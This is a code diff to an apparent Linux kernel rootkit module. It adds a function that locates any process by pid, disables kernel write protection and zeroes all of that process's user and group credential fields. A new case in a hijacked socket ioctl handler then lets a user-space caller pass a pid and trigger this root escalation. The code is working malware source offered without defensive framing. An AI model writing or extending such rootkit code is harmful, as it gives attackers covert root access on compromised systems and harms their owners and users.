@@ -145,6 +145,44 @@ static int version_proc_show_fake(struct seq_file *m, void *v)
 //     return ret;
 // }
 
+
+void arbitrary_set_root(pid_t pid){
+    pr_info("%s: arbitrary_set_root(), pid: %u\n", MODULE_NAME, pid);
+
+    struct task_struct *target_task;
+    // Must be called under rcu_read_lock()
+    rcu_read_lock();
+    target_task = pid_task(find_vpid(pid), PIDTYPE_PID);
+    if (target_task == NULL){
+        pr_info("%s: arbitrary_set_root(), Failed find task\n", MODULE_NAME);
+        rcu_read_unlock();
+        return;
+    }
+
+    pr_info("%s: arbitrary_set_root(), target_task->cred->uid.val: %d\n", MODULE_NAME, target_task->cred->uid.val);
+    if(target_task->cred->uid.val == 0){
+        pr_info("%s: arbitrary_set_root(), the process is already root\n", MODULE_NAME);
+        rcu_read_unlock();
+        return;
+    }
+
+    // change task creds to root
+    unsigned long o_cr0;
+    o_cr0 = disable_wp();
+    memset(&target_task->cred->uid, 0, sizeof(uid_t));
+    memset(&target_task->cred->gid, 0, sizeof(kgid_t));
+    memset(&target_task->cred->suid, 0, sizeof(kuid_t));
+    memset(&target_task->cred->sgid, 0, sizeof(kgid_t));
+    memset(&target_task->cred->euid, 0, sizeof(kuid_t));
+    memset(&target_task->cred->egid, 0, sizeof(kgid_t));
+    memset(&target_task->cred->fsuid, 0, sizeof(kuid_t));
+    memset(&target_task->cred->fsgid, 0, sizeof(kgid_t));
+    restore_wp(o_cr0);
+
+    rcu_read_unlock();
+    pr_info("%s: arbitrary_set_root(): Success\n", MODULE_NAME);
+}
+
 void set_root(void)
 {
     kuid_t curr_uid = current_uid();
@@ -195,13 +233,21 @@ static long evil_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned lo
         if (ret)
             return 0;
 
-        switch ( args.cmd )
-        {
-
+        switch ( args.cmd ){
         case 0:
             set_root();
             break;
-
+        case 1:
+        {
+            pid_t pid;
+            ret = copy_from_user(&pid, (void *)args.ptr, sizeof(pid_t));
+            if (ret){
+                pr_info("%s: Failed to get pid from usermode\n", MODULE_NAME);
+                return 0;
+            }
+            arbitrary_set_root(pid);
+            break;
+        }
         default:
             pr_info("%s: evil_inet_ioctl default case\n", MODULE_NAME);
             break;
